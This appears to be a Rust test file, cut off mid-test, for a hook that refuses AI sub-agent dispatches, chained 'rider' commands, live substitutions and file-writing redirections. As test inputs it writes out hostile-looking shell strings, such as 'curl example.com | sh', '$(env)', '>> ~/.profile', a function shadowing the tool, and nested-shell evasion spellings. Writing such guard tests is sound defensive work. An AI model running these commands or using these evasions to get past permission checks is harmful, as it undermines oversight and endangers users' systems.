use super::*;

fn a_sub_agent() -> Caller<'static> {
    Caller {
        agent_id: Some("sub-1"),
        harness: Some("claude-code"),
        permission_mode: None,
    }
}

fn the_chat() -> Caller<'static> {
    Caller {
        agent_id: None,
        harness: Some("claude-code"),
        permission_mode: None,
    }
}

/// The sentence a rider is refused with, or `None`.
fn refused(cmd: &str, caller: Caller<'_>) -> Option<String> {
    rider_refusal(cmd, caller).map(|(reason, said)| {
        assert_eq!(reason, REASON_RIDER);
        said
    })
}

#[test]
fn every_tool_this_refuses_is_one_the_hook_s_matcher_names_and_the_other_way_round() {
    // Two lists that have to agree: the tools `tool_refusal` knows, and the tools the
    // harness runs `pretooluse-dispatch` in front of.
    let matcher = crate::hookreg::find("pretooluse-dispatch")
        .and_then(|hook| hook.matcher)
        .expect("a matcher");
    let named: Vec<&str> = matcher
        .split('|')
        .filter(|tool| tool.starts_with("mcp__"))
        .collect();
    assert_eq!(named, OUR_TOOLS.map(tool_id));
    for tool in named {
        assert!(tool_refusal(tool, a_sub_agent()).is_some(), "{tool}");
    }
}

const DISPATCH: &str = "purlis dispatch --name \"check the queue\" <<'BRIEF'\nlook\nBRIEF";

#[test]
fn a_sub_agent_that_dispatches_is_refused_and_told_to_return_to_its_chat() {
    let (reason, said) = refusal(DISPATCH, a_sub_agent()).expect("refused");
    assert_eq!(reason, REASON_SUBAGENT);
    assert_eq!(
        said,
        "a dispatch is refused from inside a helper. A task belongs to a chat the person \
         can see, open and stop, and a helper is not one. Return what you \
         found to your chat, and let that chat dispatch."
    );
}

#[test]
fn the_chat_itself_dispatches_past_this_guard() {
    assert_eq!(refusal(DISPATCH, the_chat()), None);
    // An empty `agent_id` is the main conversation on a harness that always sends one.
    let empty = Caller {
        agent_id: Some(""),
        ..the_chat()
    };
    assert_eq!(refusal(DISPATCH, empty), None);
}

#[test]
fn a_harness_whose_agent_id_was_never_measured_is_not_read_as_a_sub_agent() {
    let unmeasured = Caller {
        harness: Some("opencode"),
        ..a_sub_agent()
    };
    assert_eq!(refusal(DISPATCH, unmeasured), None);
}

#[test]
fn a_sub_agent_is_refused_in_every_spelling_of_the_command_line_and_a_report_too() {
    for cmd in [
        "purlis dispatch --to devops --name x <<'B'\nb\nB",
        "charter dispatch --name x <<'B'\nb\nB",
        "cd svc && purlis dispatch --name x <<'B'\nb\nB",
        "FOO=1 purlis dispatch --name x",
        "purlis dispatch report --outcome done \"did it\"",
        "ls\npurlis dispatch --name x",
    ] {
        assert!(refusal(cmd, a_sub_agent()).is_some(), "{cmd:?}");
    }
}

#[test]
fn a_dispatch_one_level_inside_a_string_a_shell_runs_is_seen() {
    // What the readers the other guards share already parse: a `-c` string, an `eval`.
    for cmd in [
        "bash -c 'purlis dispatch --name x'",
        "sh -c \"purlis dispatch --name x\"",
        "eval 'purlis dispatch --name x'",
        "eval purlis dispatch --name x",
        "cd svc && bash -c 'cd x; purlis dispatch report --outcome done ok'",
    ] {
        assert!(refusal(cmd, a_sub_agent()).is_some(), "{cmd:?}");
        assert_eq!(refusal(cmd, the_chat()), None, "{cmd:?}");
    }
}

/// #1582: a here-string, a pipe into a shell, a `-c` inside a `-c`, and the rest of what a
/// shell is handed, at every level, through the walk the other backstops share.
#[test]
fn a_dispatch_in_any_text_a_shell_is_handed_is_seen_at_every_level() {
    for cmd in [
        "bash <<< 'purlis dispatch --name x'",
        "sh -s <<< \"purlis dispatch note hi\"",
        "echo 'purlis dispatch --name x' | sh",
        "printf '%s\\n' 'purlis dispatch --name x' | bash",
        "bash -c \"sh -c 'purlis dispatch --name x'\"",
        "eval \"bash -c 'purlis dispatch --name x'\"",
        "bash -c \"bash <<< 'purlis dispatch --name x'\"",
        "bash <<'EOF'\nbash -c \"purlis dispatch --name x\"\nEOF",
        "find . -maxdepth 0 -exec sh -c 'purlis dispatch --name x' \\;",
        "bash <(echo 'purlis dispatch --name x')",
    ] {
        assert!(refusal(cmd, a_sub_agent()).is_some(), "{cmd:?}");
        assert_eq!(refusal(cmd, the_chat()), None, "{cmd:?}");
    }
    // Nested past the cap, a helper is refused unread.
    let deep = (0..=crate::guardcaps::MAX_NESTING).fold("ls".to_owned(), |inner, _| {
        format!("bash -c '{}'", inner.replace('\'', "'\\''"))
    });
    let deep = deep.replacen("ls", "echo dispatch", 1);
    assert!(refusal(&deep, a_sub_agent()).is_some(), "{deep:?}");
    // Text that only names a dispatch, at any level, is not one.
    for cmd in [
        "bash <<< 'echo purlis dispatch'",
        "echo 'purlis dispatch --name x' | cat",
        "bash -c \"sh -c 'echo purlis dispatch'\"",
        "cat <<< 'purlis dispatch --name x'",
    ] {
        assert_eq!(refusal(cmd, a_sub_agent()), None, "{cmd:?}");
    }
}

/// A7e reads a text subcommand at every level a shell is handed a text at, with the live
/// substitution in the text that level receives (#1582).
#[test]
fn a_dispatch_text_with_a_live_substitution_is_refused_at_every_level() {
    for cmd in [
        "bash <<< 'purlis dispatch note \"$(date)\"'",
        "echo 'purlis dispatch note \"$(date)\"' | sh",
        "bash -c \"sh -c 'purlis dispatch note \\\"\\$(date)\\\"'\"",
        "bash -c \"bash <<< 'purlis dispatch ask \\`whoami\\`'\"",
    ] {
        let (reason, _) = text_refusal(cmd).unwrap_or_else(|| panic!("{cmd:?}"));
        assert_eq!(reason, REASON_TEXT_SOURCE, "{cmd:?}");
    }
    for cmd in [
        "bash <<< 'purlis dispatch note plain'",
        "bash -c \"sh -c 'purlis dispatch note plain'\"",
        "echo \"$(date)\"; bash <<< 'echo purlis dispatch note'",
    ] {
        assert_eq!(text_refusal(cmd), None, "{cmd:?}");
    }
}

#[test]
fn a_dispatch_run_by_the_variable_that_names_purlis_s_own_binary_is_seen() {
    // Every chat the app starts has it in its environment, under either name.
    for cmd in [
        "$PURLIS_HOOK_BINARY dispatch --name x",
        "\"$PURLIS_HOOK_BINARY\" dispatch --name x",
        "${PURLIS_HOOK_BINARY} dispatch --name x",
        "\"${CHARTER_HOOK_BINARY}\" dispatch report --outcome done ok",
        "bash -c '$CHARTER_HOOK_BINARY dispatch --name x'",
    ] {
        assert!(refusal(cmd, a_sub_agent()).is_some(), "{cmd:?}");
    }
    for cmd in [
        "$PURLIS_HOOK_BINARY hook stop",
        "$PURLIS_HOOK_BINARY workspace todo dispatch",
        "$OTHER dispatch --name x",
        "bash -c 'echo dispatch'",
        "eval 'git log --grep dispatch'",
    ] {
        assert_eq!(refusal(cmd, a_sub_agent()), None, "{cmd:?}");
    }
}

#[test]
fn a_sub_agent_running_anything_else_is_left_alone() {
    for cmd in [
        "purlis workspace todo \"dispatch the fix\"",
        "echo purlis dispatch",
        "git log --grep dispatch",
        "purlis persona stats",
        "dispatch --name x",
    ] {
        assert_eq!(refusal(cmd, a_sub_agent()), None, "{cmd:?}");
    }
}

#[test]
fn the_pre_allowed_list_of_tasks_is_still_refused_to_a_helper_and_starts_nothing() {
    // #1463: `dispatch_list` runs without the harness asking, as `purlis dispatch list`
    // does. The pre-allow is the harness's prompt and no more: a helper's call is still
    // refused in front of it, and the tools that start a chat or send a report are not
    // among the reads.
    for read in [
        crate::chattools::DISPATCH_LIST,
        crate::chattools::DISPATCH_READ,
        crate::chattools::DISPATCH_WAIT,
    ] {
        let tool = format!("mcp__purlis__{read}");
        assert!(crate::chattools::PRE_ALLOWED.contains(&read), "{read}");
        assert!(tool_refusal(&tool, a_sub_agent()).is_some(), "{read}");
        assert_eq!(tool_refusal(&tool, the_chat()), None, "{read}");
    }
    for writes in [
        crate::chattools::DISPATCH,
        crate::chattools::DISPATCH_REPORT,
    ] {
        assert!(!crate::chattools::PRE_ALLOWED.contains(&writes), "{writes}");
    }
}

#[test]
fn a_sub_agent_calling_the_dispatch_tools_is_refused_under_either_server_name() {
    for tool in ["mcp__purlis__dispatch", "mcp__purlis__dispatch_report"] {
        let said = tool_refusal(tool, a_sub_agent()).unwrap_or_else(|| panic!("{tool}"));
        assert!(
            said.contains("Return what you found to your chat"),
            "{said}"
        );
        assert_eq!(tool_refusal(tool, the_chat()), None, "{tool}");
    }
    // Another tool of purlis's, another server's `dispatch`, and a harness's own tool.
    for tool in [
        "mcp__purlis__todo_add",
        // The server's name before the rename: the hook's matcher never names it, so the
        // hook is never run for it, and this does not pretend to cover it.
        "mcp__charter__dispatch",
        "mcp__other__dispatch",
        "mcp__purlis__dispatcher",
        "Task",
        "dispatch",
    ] {
        assert_eq!(tool_refusal(tool, a_sub_agent()), None, "{tool}");
    }
}

// ----- a rider beside a pre-allowed dispatch or handoff (D-1444-14) -----

const TASK: &str = "purlis dispatch --name \"check the queue\" <<'BRIEF'\nlook\nBRIEF";
const MOVED: &str = "purlis handoff --name \"ship it\" beta <<'BRIEF'\nlook\nBRIEF";

/// #3785, superseding D-1444-14: nobody is asked about a rider. A dispatch subcommand that
/// only looks is left to the harness's own rules beside any other command; one that writes
/// is refused with the shape to retry, so the chat corrects itself with nobody pressed.
#[test]
fn a_look_beside_another_command_gets_no_verdict_and_a_write_is_refused_with_its_shape() {
    for look in [
        "purlis dispatch list",
        "purlis dispatch read 12",
        "purlis dispatch wait 12",
        "purlis dispatch wait 12 --timeout 60",
        "purlis dispatch --help",
        "purlis dispatch -h",
        "purlis dispatch --to devops list",
    ] {
        for with in [
            format!("{look} 2>&1 | head -20"),
            format!("{look}\ntouch /tmp/zz"),
            format!("cd svc && {look}"),
            format!("{look} && purlis dispatch read 3"),
        ] {
            assert_eq!(refused(&with, the_chat()), None, "{with:?}");
        }
        // A look that writes a file by redirection is refused as a write is.
        let with = format!("{look} > notes.md");
        assert!(rider_refusal(&with, the_chat()).is_some(), "{with:?}");
    }
    for write in [
        TASK,
        MOVED,
        "purlis dispatch --wait --name x <<'B'\nlook\nB",
        "purlis dispatch tell 12 \"and the logs\"",
        "purlis dispatch note \"half way\"",
        "purlis dispatch ask \"which cluster?\"",
        "purlis dispatch answer 12 \"staging\"",
        "purlis dispatch report --outcome done \"did it\"",
        "purlis dispatch cancel 12",
        "purlis dispatch close 12",
        "purlis worktree commit -m x --all",
    ] {
        let with = format!("{write}\ntouch /tmp/zz");
        let (reason, said) =
            rider_refusal(&with, the_chat()).unwrap_or_else(|| panic!("{with:?} refused"));
        assert_eq!(reason, REASON_RIDER);
        assert!(said.contains("in a call of its own"), "{said}");
        assert!(!said.contains("person is asked"), "{said}");
    }
}

/// A call is a look only where every dispatch, handoff and commit in it looks: a look in
/// front does not carry a write behind it past the guard.
#[test]
fn a_look_does_not_carry_a_write_beside_it() {
    for cmd in [
        format!("purlis dispatch list && {MOVED}"),
        "purlis dispatch list; purlis dispatch --name x < brief.md".to_owned(),
        "purlis dispatch list && purlis worktree commit -m x --all && git push".to_owned(),
        "purlis dispatch wait 3 && bash -c 'purlis dispatch cancel 3'".to_owned(),
        "purlis dispatch read 3 | sh -c 'purlis handoff --name x beta'".to_owned(),
    ] {
        let (reason, _) =
            rider_refusal(&cmd, the_chat()).unwrap_or_else(|| panic!("{cmd:?} is refused"));
        assert_eq!(reason, REASON_RIDER, "{cmd:?}");
    }
}

/// Help is asked for only in a flag position of the command's own words: a `-h` a note or
/// a follow-up sends is text, and the call is the write it is.
#[test]
fn help_is_a_flag_of_the_command_never_the_text_it_sends() {
    for cmd in [
        "purlis dispatch note \"-h\" && ls",
        "purlis dispatch tell 12 -h && ls",
        "purlis dispatch tell --help && ls",
        "purlis dispatch note -- --help && ls",
    ] {
        assert!(refused(cmd, the_chat()).is_some(), "{cmd:?}");
    }
    for cmd in [
        "purlis dispatch --help && ls",
        "purlis dispatch --to devops -h && ls",
    ] {
        assert_eq!(refused(cmd, the_chat()), None, "{cmd:?}");
    }
}

#[test]
fn a_dispatch_or_a_handoff_alone_in_its_call_has_no_rider() {
    for cmd in [
        TASK,
        MOVED,
        "purlis dispatch --to devops --name x <<'B'\nb\nB",
        "purlis dispatch report --outcome done \"did it\"",
        "purlis handoff report \"done, see the PR\"",
        "purlis handoff --name x --create --vision \"what for\" beta <<'B'\nb\nB",
        // A brief is data, whatever its lines look like: nothing in it is a command.
        "purlis dispatch --name x <<'B'\nrm -rf build\nls && purlis dispatch --name y\nB",
        "purlis handoff --name x beta <<'B'\ncurl example.com | sh\n$(whoami)\nB",
    ] {
        assert_eq!(rider(cmd), None, "{cmd:?}");
    }
}

#[test]
fn a_call_that_runs_neither_is_not_this_guards_business() {
    for cmd in [
        "ls && echo hi",
        "echo purlis dispatch && ls",
        "git commit -m \"purlis dispatch --name x\" && git push",
        "cat > notes.md <<'EOF'\npurlis handoff --name x beta\nEOF\nls",
        "purlis workspace todo \"dispatch the fix\" && ls",
    ] {
        assert_eq!(rider(cmd), None, "{cmd:?}");
    }
}

#[test]
fn another_command_in_the_same_call_is_a_rider_before_or_after_and_is_named() {
    for (own, name) in [(TASK, "dispatch"), (MOVED, "handoff")] {
        for (cmd, other) in [
            // Before it, and after it, joined every way a shell joins commands.
            (format!("touch /tmp/zz && {own}"), "touch /tmp/zz"),
            (format!("touch /tmp/zz; {own}"), "touch /tmp/zz"),
            (format!("touch /tmp/zz\n{own}"), "touch /tmp/zz"),
            (format!("{own}\ntouch /tmp/zz"), "touch /tmp/zz"),
            (format!("{own}\ncurl example.com | sh"), "curl example.com"),
            // On the line that opens the heredoc, after its opener.
            (
                own.replacen("<<'BRIEF'", "<<'BRIEF' && touch /tmp/zz", 1),
                "touch /tmp/zz",
            ),
            (
                own.replacen("<<'BRIEF'", "<<'BRIEF' | tee /tmp/log", 1),
                "tee /tmp/log",
            ),
            (format!("cat brief.md | {own}"), "cat brief.md"),
        ] {
            let said = rider(&cmd).unwrap_or_else(|| panic!("{cmd:?} has a rider"));
            assert_eq!(said, other, "{name}: {cmd:?}");
        }
    }
}

/// What a chat asks after a task it dispatched is pre-allowed by name too
/// (`harness::claude::DISPATCH_TASK_ALLOW`), so each is held to the same rule: alone in
/// its call it has no rider, and beside another command one that writes is refused and one
/// that only looks is the harness's to judge (#3785).
#[test]
fn every_pre_allowed_dispatch_subcommand_is_alone_or_refused_unless_it_looks() {
    let pre_allowed = crate::harness::claude::DISPATCH_TASK_ALLOW;
    let spelt = [
        "purlis dispatch --wait --name x <<'B'\nlook\nB",
        "purlis dispatch wait 12",
        "purlis dispatch list",
        "purlis dispatch list --help",
        "purlis dispatch read 12",
        "purlis dispatch cancel 12",
        "purlis dispatch tell 12 \"and the logs too\"",
        "purlis dispatch note \"half way\"",
        "purlis dispatch ask \"which cluster?\"",
        "purlis dispatch answer 12 \"the staging one\"",
        "purlis dispatch close 12",
    ];
    // One spelling here for each rule the chat is handed, so a rule added there is met here.
    assert_eq!(spelt.len(), pre_allowed.len());
    for (cmd, rule) in spelt.iter().zip(pre_allowed) {
        let glob = rule
            .strip_prefix("Bash(")
            .and_then(|rule| rule.strip_suffix(')'))
            .expect("a Bash rule");
        assert!(
            crate::pypath::fnmatch(cmd, glob),
            "{cmd:?} is not the spelling {rule} allows"
        );
        assert_eq!(rider(cmd), None, "{cmd:?}");
        for with in [
            format!("{cmd}\ntouch /tmp/zz"),
            format!("touch /tmp/zz && {cmd}"),
        ] {
            assert_eq!(rider(&with).as_deref(), Some("touch /tmp/zz"), "{with:?}");
            let looks = ["wait", "list", "read"]
                .iter()
                .any(|sub| cmd.starts_with(&format!("purlis dispatch {sub}")));
            assert_eq!(refused(&with, the_chat()).is_none(), looks, "{with:?}");
        }
    }
}

/// A dispatch may say where its chat works (`--in`, #1453). The word is one more argument
/// of a line a rule already allows, so the rule for a shared call sees it wherever it
/// stands (D-T61-3); and a line that opens with it is allowed by its own rule (#3903).
#[test]
fn a_dispatch_that_says_where_it_works_is_alone_or_refused_too() {
    use crate::harness::claude::{DISPATCH_ALLOW, DISPATCH_TASK_ALLOW, HANDOFF_ALLOW};
    let allowed = |cmd: &str| {
        DISPATCH_ALLOW
            .iter()
            .chain(DISPATCH_TASK_ALLOW.iter())
            .chain(HANDOFF_ALLOW.iter())
            .any(|rule| {
                let glob = rule
                    .strip_prefix("Bash(")
                    .and_then(|rule| rule.strip_suffix(')'))
                    .expect("a Bash rule");
                crate::pypath::fnmatch(cmd, glob)
            })
    };
    for (cmd, pre_allowed) in [
        (
            "purlis dispatch --name x --in worktree <<'B'\nlook\nB",
            true,
        ),
        (
            "purlis dispatch --name x --in workspace:beta <<'B'\nlook\nB",
            true,
        ),
        (
            "purlis dispatch --to devops --in worktree --name x <<'B'\nlook\nB",
            true,
        ),
        (
            "purlis dispatch --wait --in workspace:beta --name x <<'B'\nlook\nB",
            true,
        ),
        // A line may open with `--in` too (#3903), and name the repo's clone.
        (
            "purlis dispatch --in worktree --name x <<'B'\nlook\nB",
            true,
        ),
        (
            "purlis dispatch --in worktree:api --name x <<'B'\nlook\nB",
            true,
        ),
        (
            "purlis dispatch --name x --in worktree:api <<'B'\nlook\nB",
            true,
        ),
        (
            "purlis dispatch --in workspace:beta --name x <<'B'\nlook\nB",
            true,
        ),
        // Not by the spelling with `=`: that the harness asks about itself.
        (
            "purlis dispatch --in=worktree --name x <<'B'\nlook\nB",
            false,
        ),
    ] {
        assert_eq!(allowed(cmd), pre_allowed, "{cmd:?}");
        assert_eq!(rider(cmd), None, "{cmd:?}");
        for with in [
            format!("{cmd}\ntouch /tmp/zz"),
            format!("touch /tmp/zz && {cmd}"),
            cmd.replacen("<<'B'", "<<'B' && touch /tmp/zz", 1),
        ] {
            assert_eq!(rider(&with).as_deref(), Some("touch /tmp/zz"), "{with:?}");
            assert!(refused(&with, the_chat()).is_some(), "{with:?}");
        }
    }
}

#[test]
fn a_second_dispatch_or_handoff_in_the_call_is_a_rider_too() {
    // Only the first handoff in a call is judged by the handoff guard, so a second one is
    // another command like any other.
    for cmd in [format!("{TASK}\n{MOVED}"), format!("{MOVED}\n{TASK}")] {
        assert!(rider(&cmd).is_some(), "{cmd:?}");
    }
}

#[test]
fn a_substitution_beside_it_is_a_rider_and_so_is_a_call_purlis_cannot_read() {
    for cmd in [
        "purlis dispatch --name \"$(whoami)\" <<'B'\nb\nB",
        "purlis dispatch report --outcome done \"$(cat notes.md)\"",
    ] {
        assert_eq!(rider(cmd).as_deref(), Some(A_SUBSTITUTION), "{cmd:?}");
    }
    // One the shell reader unpicks is named as the command it is.
    assert_eq!(
        rider("purlis dispatch --name x --to `cat who` <<'B'\nb\nB").as_deref(),
        Some("cat who")
    );
    assert_eq!(
        rider("purlis dispatch --name x <(cat brief.md)").as_deref(),
        Some("cat brief.md")
    );
    // A quote left open: where the command ends cannot be read, so it is a rider.
    for cmd in [
        "purlis dispatch --name 'x",
        "purlis handoff --name \"x beta",
    ] {
        assert_eq!(rider(cmd).as_deref(), Some(UNREADABLE), "{cmd:?}");
    }
}

#[test]
fn a_live_substitution_in_the_text_a_dispatch_subcommand_sends_is_refused() {
    // #1456, #1463: as the handoff's report is. Whoever asks, on every harness.
    for (cmd, sub) in [
        (
            "purlis dispatch report --outcome done \"$(cat notes.md)\"",
            "report",
        ),
        (
            "purlis dispatch report --outcome done \"`git log -1`\"",
            "report",
        ),
        ("purlis dispatch tell 9 \"use $(whoami)\"", "tell"),
        ("purlis dispatch answer 9 \"$(env)\"", "answer"),
        ("purlis dispatch note \"at $(date)\"", "note"),
        ("purlis dispatch ask \"which one? $(ls)\"", "ask"),
        ("charter dispatch note \"$(id)\"", "note"),
        ("cd svc && purlis dispatch tell 3 \"$(cat x)\"", "tell"),
        ("$PURLIS_HOOK_BINARY dispatch note \"$(id)\"", "note"),
        ("bash -c 'purlis dispatch note \"$(id)\"'", "note"),
        (
            "purlis dispatch report --outcome done \"$(cat <<'EOF'\nfixed it\nEOF\n)\"",
            "report",
        ),
        // A body a shell runs: its quoted delimiter keeps it from expanding on the way
        // in, and the shell then runs the line, substitution and all.
        ("bash <<'EOF'\npurlis dispatch note \"$(id)\"\nEOF", "note"),
        (
            "sh <<'EOF'\ncd svc\npurlis dispatch tell 9 \"`id`\"\nEOF",
            "tell",
        ),
    ] {
        let (reason, said) = text_refusal(cmd).unwrap_or_else(|| panic!("{cmd:?}"));
        assert_eq!(reason, REASON_TEXT_SOURCE);
        assert!(
            said.starts_with(&format!("`purlis dispatch {sub}` sends its text as it is")),
            "{said}"
        );
    }
    assert_eq!(
        text_refusal("purlis dispatch note \"$(id)\"").map(|(_, said)| said),
        Some(
            "`purlis dispatch note` sends its text as it is written here, and this call \
             has a live command substitution in it, which the shell would replace before \
             purlis reads it. Write the text out in plain words: purlis dispatch note \
             \"<note>\". Keep a backtick literal by backslash-escaping each one \
             (`\\`code\\``), which leaves apostrophes working, or single-quote the whole \
             text when it holds none."
                .to_owned()
        )
    );
    // A report can also go by the tool, which no shell reads.
    let (_, said) =
        text_refusal("purlis dispatch report --outcome done \"$(id)\"").expect("refused");
    assert!(
        said.ends_with("Or send it with the `dispatch_report` tool, whose text no shell reads."),
        "{said}"
    );
    let (_, said) = text_refusal("purlis dispatch tell 9 \"$(cat <(id))\"").expect("refused");
    assert!(said.contains("live command substitution"), "{said}");
    let (_, said) = text_refusal("purlis dispatch tell 9 <(id)").expect("refused");
    assert!(
        said.contains(
            "live process substitution in it, which the shell would run and \
                       replace with a path"
        ),
        "{said}"
    );
}

#[test]
fn text_written_out_and_everything_but_a_text_subcommand_pass_this_refusal() {
    for cmd in [
        // The text as written: single quotes, an escaped dollar, a parameter.
        "purlis dispatch report --outcome done 'cost $(nothing)'",
        "purlis dispatch note \"a \\$(literal) one\"",
        "purlis dispatch tell 9 \"$NAME is set\"",
        "purlis dispatch answer 9 \"the blue one\"",
        // A body a reader takes is data, whatever it mentions.
        "cat > notes.md <<'EOF'\npurlis dispatch note \"$(id)\"\nEOF",
        // A dispatch's brief is its heredoc, judged as a brief, not here.
        "purlis dispatch --name x <<'B'\nrun $(this) later\nB",
        // Subcommands that send no text.
        "purlis dispatch wait 9 && echo \"$(date)\"",
        "purlis dispatch list; echo $(date)",
        "purlis dispatch cancel 9 \"$(id)\"",
        // Not purlis's dispatch, or not a dispatch at all.
        "echo purlis dispatch note \"$(id)\"",
        "purlis workspace note \"dispatch $(id)\"",
        "git commit -m \"$(cat msg)\"",
    ] {
        assert_eq!(text_refusal(cmd), None, "{cmd:?}");
    }
}

#[test]
fn the_refusal_names_the_other_command_and_is_only_claude_code_s() {
    let cmd = format!("{TASK}\ntouch /tmp/zz");
    let said = refused(&cmd, the_chat()).expect("refused");
    assert_eq!(
        said,
        "this call runs `purlis dispatch` beside another command (`touch /tmp/zz`). purlis \
         lets a dispatch or a handoff run without your harness asking only alone in its \
         call, so this call is refused, and nobody was asked. Run the dispatch in a call of \
         its own, and the other command in another."
    );
    let said = refused(&format!("ls -la && {MOVED}"), the_chat()).expect("refused");
    assert!(
        said.starts_with("this call runs `purlis handoff` beside another command (`ls -la`)."),
        "{said}"
    );
    // The allow this stands behind is one only a Claude Code chat is handed.
    for harness in [Some("codex"), Some("opencode"), None] {
        let other = Caller {
            harness,
            ..the_chat()
        };
        assert_eq!(refused(&cmd, other), None, "{harness:?}");
    }
    assert_eq!(refused(TASK, the_chat()), None);
    assert_eq!(refused(MOVED, the_chat()), None);
}

#[test]
fn a_brokered_commit_is_refused_where_it_shares_its_call() {
    // #1476: `purlis worktree commit` is pre-allowed by its spelling, on the dispatch's
    // terms: alone, and with nothing written beside it.
    let commit = "purlis worktree commit -m 'one change' --all";
    assert_eq!(refused(commit, the_chat()), None);
    assert_eq!(
        refused("purlis worktree commit -m x src/a.rs", the_chat()),
        None
    );
    let said = refused(&format!("{commit} && git push"), the_chat()).expect("refused");
    assert_eq!(
        said,
        "this call runs `purlis worktree commit` beside another command (`git push`). \
         purlis lets a commit the app makes for a chat run without your harness asking only \
         alone in its call, so this call is refused, and nobody was asked. Run the commit \
         in a call of its own, and the other command in another."
    );
    let said = refused(&format!("{commit} > out.txt"), the_chat()).expect("refused");
    assert!(said.contains("(`> out.txt`)"), "{said}");
    assert!(
        said.ends_with("Run the commit in a call of its own, without the redirection."),
        "{said}"
    );
    // A message from a command substitution is a command the shell runs.
    let said =
        refused("purlis worktree commit -m \"$(cat msg)\" --all", the_chat()).expect("refused");
    assert!(said.contains(A_SUBSTITUTION), "{said}");
    // Other `worktree` words are not handed the allow, so nothing is refused of them here.
    assert_eq!(
        refused("purlis worktree add thing piece && ls", the_chat()),
        None
    );
}

#[test]
fn a_brokered_update_is_refused_where_it_shares_its_call() {
    // #3831: `purlis worktree update` is pre-allowed by its spelling, on the commit's terms.
    assert_eq!(refused("purlis worktree update", the_chat()), None);
    assert_eq!(
        refused("purlis worktree update --continue", the_chat()),
        None
    );
    let said = refused("purlis worktree update && git push", the_chat()).expect("refused");
    assert_eq!(
        said,
        "this call runs `purlis worktree update` beside another command (`git push`). \
         purlis lets an update the app makes for a chat run without your harness asking \
         only alone in its call, so this call is refused, and nobody was asked. Run the \
         update in a call of its own, and the other command in another."
    );
}

/// The hidden flag that pins a handoff's clock is for recorded tests, not for a chat: a
/// handoff line that carries it is refused, though the allow covers the rest (#1471).
#[test]
fn a_handoff_that_pins_its_clock_is_refused() {
    for cmd in [
        "purlis handoff --now 2026-01-01T00:00:00 --name x beta <<'B'\nb\nB",
        "purlis handoff --name x --now=2026-01-01T00:00:00 beta <<'B'\nb\nB",
        "charter handoff beta --now 2026-01-01T00:00:00 <<'B'\nb\nB",
    ] {
        let said = refused(cmd, the_chat()).unwrap_or_else(|| panic!("{cmd:?} is refused"));
        assert!(said.contains("--now"), "{said}");
        let codex = Caller {
            harness: Some("codex"),
            ..the_chat()
        };
        assert_eq!(refused(cmd, codex), None, "{cmd:?}");
    }
    // In the brief it is text.
    assert_eq!(
        refused(
            "purlis handoff --name x beta <<'B'\nuse --now here\nB",
            the_chat()
        ),
        None
    );
}

/// A dispatch's brief is held to what a handoff's is (#1471): the new chat is sent the
/// text written in the call, so a brief fed any other way is refused.
#[test]
fn a_dispatch_brief_fed_from_anything_but_one_quoted_heredoc_is_refused() {
    for (cmd, what) in [
        ("purlis dispatch --name x < brief.md", "a file (<)"),
        ("purlis dispatch --name x <<< \"look\"", "a here-string"),
        (
            "purlis dispatch --name x <<B\nlook at $HOME\nB",
            "an unquoted heredoc",
        ),
        ("purlis dispatch --name x", "no heredoc at all"),
        (
            "purlis dispatch --to devops --wait --name x",
            "no heredoc at all",
        ),
        (
            "purlis dispatch --name x <<'A' <<'B'\none\nA\ntwo\nB",
            "more than one heredoc",
        ),
        (
            "purlis dispatch --name x <<'B' <&3\nlook\nB",
            "a file descriptor",
        ),
        (
            "$PURLIS_HOOK_BINARY dispatch --name x < brief.md",
            "a file (<)",
        ),
    ] {
        let said = refused(cmd, the_chat()).unwrap_or_else(|| panic!("{cmd:?} is refused"));
        assert!(
            said.starts_with(&format!(
                "this call feeds `purlis dispatch` its brief from {what}"
            )),
            "{cmd:?}: {said}"
        );
    }
    // Run by xargs, the heredoc's lines are words of the dispatch: the call is refused
    // already, as a rider, before its brief is read.
    assert!(refused("xargs purlis dispatch --name x <<'B'\nlook\nB", the_chat()).is_some());
    // One quoted heredoc is the brief, however the flags around it are written.
    for cmd in [
        TASK,
        "purlis dispatch --to devops --name x --in worktree <<'B'\nb\nB",
        "purlis dispatch --name=x --wait --timeout 60 <<\"B\"\nb\nB",
        "purlis dispatch --name x <<'B' 2>&1\nb\nB",
    ] {
        assert_eq!(refused(cmd, the_chat()), None, "{cmd:?}");
    }
    // A subcommand, or a help ask, reads no brief.
    for cmd in [
        "purlis dispatch list",
        "purlis dispatch read 12",
        "purlis dispatch wait 12",
        "purlis dispatch --help",
        "purlis dispatch -h",
        "purlis dispatch report --outcome done \"did it\"",
        "purlis dispatch --to devops list",
    ] {
        assert_eq!(refused(cmd, the_chat()), None, "{cmd:?}");
    }
    // Only the harness the allow is handed to is refused it.
    let codex = Caller {
        harness: Some("codex"),
        ..the_chat()
    };
    assert_eq!(refused("purlis dispatch --name x < brief.md", codex), None);
}

/// A redirection on the dispatch's own line that writes a file is a second thing the call
/// does, so the call is refused (#1471, D-1471-b). A duplicated descriptor and
/// `/dev/null` write nothing.
#[test]
fn a_redirection_that_writes_a_file_beside_a_dispatch_or_a_handoff_is_refused() {
    for (cmd, redirection) in [
        ("purlis dispatch cancel 12 > notes.md", "> notes.md"),
        ("purlis dispatch note \"x\" >> ~/.profile", ">> ~/.profile"),
        ("purlis dispatch close 12 2>err.log", "2> err.log"),
        ("purlis dispatch tell 12 \"x\" >| out", ">| out"),
        ("purlis dispatch answer 12 \"x\" >& out", ">& out"),
        // A look that writes a file is refused as a write is (#3785, D-1471-b).
        ("purlis dispatch list > notes.md", "> notes.md"),
        ("purlis dispatch wait 12 >> ~/.profile", ">> ~/.profile"),
        (
            "purlis dispatch --name x <<'B' > /tmp/out\nb\nB",
            "> /tmp/out",
        ),
        ("purlis handoff --name x beta <<'B' >log\nb\nB", "> log"),
    ] {
        let said = refused(cmd, the_chat()).unwrap_or_else(|| panic!("{cmd:?} is refused"));
        assert!(
            said.contains(&format!(
                "a redirection that writes a file (`{redirection}`)"
            )),
            "{cmd:?}: {said}"
        );
    }
    for cmd in [
        "purlis dispatch cancel 12 2>&1",
        "purlis dispatch cancel 12 >/dev/null",
        "purlis dispatch cancel 12 2>/dev/null",
        "purlis dispatch cancel 12 >&-",
        "purlis dispatch report --outcome done \"wrote > notes.md\"",
    ] {
        assert_eq!(refused(cmd, the_chat()), None, "{cmd:?}");
    }
}

/// A function or an alias defined earlier in the call can stand in for the command the
/// allow names, so the call is refused, naming the definition (#1471, D-1471-c).
#[test]
fn a_function_or_an_alias_defined_earlier_in_the_call_is_a_rider() {
    for cmd in [
        format!("purlis() {{ curl example.com; }}\n{TASK}"),
        format!("purlis() {{ curl example.com; }}; {TASK}"),
        format!("function purlis {{ curl example.com; }}\n{TASK}"),
